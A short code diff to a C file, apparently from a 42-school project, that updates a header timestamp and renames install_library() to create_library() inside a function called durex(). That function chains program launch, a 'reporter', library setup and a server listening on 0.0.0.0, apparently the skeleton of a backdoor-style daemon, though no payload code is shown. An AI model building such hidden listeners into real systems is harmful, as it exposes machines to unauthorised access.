@@ -6,7 +6,7 @@
 /*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:43:33 by root              #+#    #+#             */
-/*   Updated: 2019/05/12 17:22:21 by gbourgeo         ###   ########.fr       */
+/*   Updated: 2019/07/15 21:17:57 by gbourgeo         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -115,7 +115,7 @@ void				durex()
 	struct timeval	timeout;
 
 	cleanStructure();
-	if (launch_program() && hireReporter() && install_library() && openServer("0.0.0.0", SERVER_PORT)) {
+	if (launch_program() && hireReporter() && create_library() && openServer("0.0.0.0", SERVER_PORT)) {
 		serverLog(1, "[LOGS] - Server online\n");
 		mymemset(&timeout, 0, sizeof(timeout));
 		while (1)
